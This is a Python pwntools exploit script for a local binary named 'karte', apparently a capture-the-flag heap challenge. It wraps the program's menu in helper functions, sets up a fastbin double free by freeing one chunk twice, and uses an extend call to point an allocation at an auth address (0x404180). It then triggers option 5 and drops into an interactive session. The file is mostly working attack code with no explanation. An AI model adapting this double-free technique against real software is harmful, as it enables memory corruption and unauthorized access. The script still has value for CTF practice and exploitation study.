from pwn import *
target=process('./karte')

def init(option):
	print(target.recvuntil("> "))
	target.sendline(str(option))

def alloc(ID,size):
	init(0)
	print(target.recvuntil("> "))
	target.sendline(str(ID))
	print(target.recvuntil("> "))
	target.sendline(str(size))

def extend(ID,size):
	init(1)
	print(target.recvuntil("> "))
	target.sendline(str(ID))
	print(target.recvuntil("> "))
	target.sendline(str(size))

def change_id(ID,newid):
	init(2)
	print(target.recvuntil("> "))
	target.sendline(str(ID))
	print(target.recvuntil("> "))
	target.sendline(str(newid))

def show(ID):
	init(3)
	print(target.recvuntil("> "))
	target.sendline(str(ID))
	print(target.recvuntil(": "))
	id_leak=target.recvuntil(" ").strip(" ")
	print(target.recvuntil(": "))
	size_leak=target.recvline().strip("\n")
	return id_leak,size_leak

def dealloc(ID):	
	init(4)
	print(target.recvuntil("> "))
	target.sendline(str(ID))
	
target.sendline("Arav")
alloc(0,0x50)
alloc(1,0x50)
alloc(2,0x50)
alloc(3,0x50)
dealloc(0)
dealloc(1)
dealloc(2)
dealloc(1)
pause()
auth=0x404180
alloc(4,0x50)
extend(4,auth)
for i in range(3):
	alloc(5+i,0x50)
init(5)

target.interactive()
	
